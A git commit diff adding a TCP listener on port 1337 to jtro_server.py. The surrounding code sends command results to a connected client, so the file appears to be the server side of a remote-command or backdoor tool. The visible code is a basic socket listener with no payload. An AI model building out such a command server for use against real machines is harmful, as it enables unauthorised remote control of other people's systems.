dcc1a2df77e0f9856752f3efa51e1c5231c9cd9d
jakiiii <me.jaki@outlook.com>
2019-02-13 12:55:15 +0600

    try to fixed client and server

--- jtro_server.py
+++ jtro_server.py
@@ -18,3 +18,15 @@ while True:
     c.send(cmd_result)
 
 c.close()
+
+#####################
+import socket
+
+
+lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+lst.bind(("192.168.31.207", 1337))
+lst.listen(5)
+print("[+] Waiting for incoming connection.")
+lst.accept()
+print("[+] Connection has been established.")
